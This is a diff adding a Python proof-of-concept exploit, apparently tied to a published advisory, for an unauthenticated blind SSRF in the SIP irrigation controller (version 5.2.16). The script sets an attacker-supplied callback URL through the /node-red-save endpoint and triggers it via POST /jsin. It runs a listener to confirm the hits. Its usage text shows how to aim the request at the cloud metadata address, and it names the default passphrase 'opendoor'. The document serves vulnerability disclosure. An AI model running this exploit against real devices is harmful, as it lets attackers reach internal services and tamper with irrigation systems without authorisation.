@@ -1,0 +1,167 @@
+#!/usr/bin/env python3
+#
+#
+# SIP Sustainable Irrigation Platform 5.x (nr-url) Blind SSRF
+#
+#
+# Vendor: Dan-in-CA
+# Product web page: https://github.com/Dan-in-CA/SIP
+# Affected version: 5.2.16
+#
+# Summary: SIP is a free Raspberry Pi based Python program for
+# controlling irrigation systems (sprinkler, drip, hydroponic,
+# etc). It uses web technology to provide an intuitive user
+# interface (UI) in several languages. The UI can be accessed
+# in your favorite browser on desktop, laptop, and mobile devices.
+# SIP has also been used to control pumps, lights, and other Irrigation
+# related equipment.
+#
+# Desc: The application accepts an attacker-supplied callback URL
+# and, when the optional Node-RED plugin is installed, later issues
+# server-side HTTP requests to that URL without validating it. This
+# can be exploited to make the device send requests to arbitrary internal
+# or external systems on the attacker's behalf, reaching services
+# that are otherwise not directly accessible. When the optional passphrase
+# is not enabled (factory default) configuring the URL and triggering
+# the request require no authentication, and where the passphrase is
+# enabled it defaults to 'opendoor'.
+#
+# -----------------------------------------------------------------------
+# $ python sip_ssrf.py 192.168.1.9 192.168.2.33 9000
+# === SIP SSRF PoC :: TARGET=http://192.168.1.9 ===
+# [*] Node-RED present (/jsin -> HTTP 200, ver="5.2.16")
+#
+# [*] nr-url payload : http://192.168.2.33:9000/ssrf-ZSL-PWN-1783027887
+#     a) set callback (unauth)    -> HTTP 303
+#     b) trigger outbound (unauth)-> HTTP 200
+#
+# [+] SSRF successful -- SIP made a server-side request to us:
+#         2026-07-02T23:31:28.393794 HIT POST /ssrf-ZSL-PWN-1783027887 from=192.168.1.9 body='water level set to 42'
+#
+# Done.
+#
+# -----------------------------------------------------------------------
+#
+# Tested on: Debian GNU/Linux 11 (bullseye) raspberrypi 6.1.21+ (armv6l/aarch64)
+#            Python 3.9.2
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-5998
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5998
+#
+#
+# 24.06.2026
+#
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
+import http.client
+import threading
+import datetime
+import time
+import ssl
+import sys
+
+if len(sys.argv) < 3:
+    print("usage: python sip_exploit.py <target> <attacker> [aport] [ssrf-url]\n"
+          "  <target>    SIP ip/host or ip/host:port (http:// or https:// optional)\n"
+          "  <attacker>  ip/host phone home\n"
+          "  [aport]     local listener port (default 9000)\n"
+          "  [ssrf-url]  fire nr-url at this exact URL (blind), omit for auto canary\n"
+          "example:\n"
+          "  python sip_ssrf.py 2.2.2.2:8083 7.7.7.7 9000\n"
+          "  python sip_ssrf.py 2.2.2.2:8083 7.7.7.7 9000 http://169.254.169.254/latest/meta-data/")
+    sys.exit(1)
+
+TARGET   = sys.argv[1]
+ATTACKER = sys.argv[2]
+APORT    = int(sys.argv[3]) if len(sys.argv) > 3 else 9000
+SSRF_URL = sys.argv[4] if len(sys.argv) > 4 else None
+SCHEME   = "http"
+if   TARGET.startswith("https://"): SCHEME, TARGET = "https", TARGET[8:]
+elif TARGET.startswith("http://"):  SCHEME, TARGET = "http",  TARGET[7:]
+TARGET = TARGET.strip("/")
+
+MARK = "ZSL-PWN-%d" % int(time.time())
+HITS = []
+
+class Handler(BaseHTTPRequestHandler):
+    def _go(self, method):
+        n = int(self.headers.get("Content-Length", 0) or 0)
+        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
+        HITS.append("%s HIT %s %s from=%s body=%r"
+                    % (datetime.datetime.now().isoformat(), method, self.path, self.client_address[0], body))
+        self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
+    def do_GET(self):  self._go("GET")
+    def do_POST(self): self._go("POST")
+    def log_message(self, *a): pass
+
+def start_listener(port):
+    try:
+        srv = HTTPServer(("0.0.0.0", port), Handler)
+    except OSError as e:
+        raise SystemExit("[!] cannot bind 0.0.0.0:%d - %s" % (port, e))
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+def req(method, path, body=None):
+    host, _, port = TARGET.partition(":")
+    port = int(port) if port else (443 if SCHEME == "https" else 80)
+    if SCHEME == "https":
+        conn = http.client.HTTPSConnection(host, port, timeout=12, context=ssl._create_unverified_context())
+    else:
+        conn = http.client.HTTPConnection(host, port, timeout=12)
+    headers = {"Content-Type": "application/json"} if body is not None else {}
+    conn.request(method, path, body=body, headers=headers)
+    r = conn.getresponse(); data = r.read(); conn.close()
+    return r.status, data
+
+def main():
+    base = "%s://%s" % (SCHEME, TARGET)
+    print("=== SIP SSRF PoC :: TARGET=%s ===" % base)
+
+    # Check Node-RED
+    try:
+        s, data = req("GET", "/jsin?gv=ver_str")
+    except Exception as e:
+        raise SystemExit("[!] cannot reach %s : %s" % (base, e))
+    if s == 404:
+        raise SystemExit("[!] /jsin -> 404 : Node-RED plugin not loaded on target. SSRF not present.")
+    print("[*] Node-RED present (/jsin -> HTTP %d, ver=%s)" % (s, data.decode("utf-8", "replace").strip()))
+
+    if SSRF_URL:
+        nr_url, confirmable = SSRF_URL, False
+    else:
+        start_listener(APORT)
+        nr_url, confirmable = "%s://%s:%d/ssrf-%s" % (SCHEME, ATTACKER, APORT, MARK), True
+    enc = urllib.parse.quote(nr_url, safe="")
+
+    print("\n[*] nr-url payload : %s" % nr_url)
+    s, _ = req("GET", "/node-red-save?nr-url=%s&chng-sd=on&chng-wl=on" % enc)
+    print("    a) set callback (unauth)    -> HTTP %d" % s)
+    try:
+        s, _ = req("POST", "/jsin", body='{"sd":"wl","val":42}')
+        print("    b) trigger outbound (unauth)-> HTTP %d" % s)
+    except (TimeoutError, OSError):
+        print("    b) trigger outbound (unauth)-> timed out: SIP is blocking the call to nr-url")
+        print("       (no server-side timeout -> the request is being made, blind)")
+
+    if not confirmable:
+        print("\n[*] Fired (blind) at %s -- confirm via your own OOB canary / target-side timing." % nr_url)
+        print("done."); return
+
+    time.sleep(2)
+    hits = [h for h in HITS if ("/ssrf-" + MARK) in h]
+    if hits:
+        print("\n[+] SSRF successful -- SIP made a server-side request to us:")
+        for h in hits: print("        " + h)
+    else:
+        print("\n[-] no callback. checklist: %s:%d reachable from SIP (port-forward / firewall)? "
+              "(node_red confirmed above, so the egress path is the usual blocker.)" % (ATTACKER, APORT))
+    print("\nDone.")
+
+if __name__ == "__main__":
+    main()
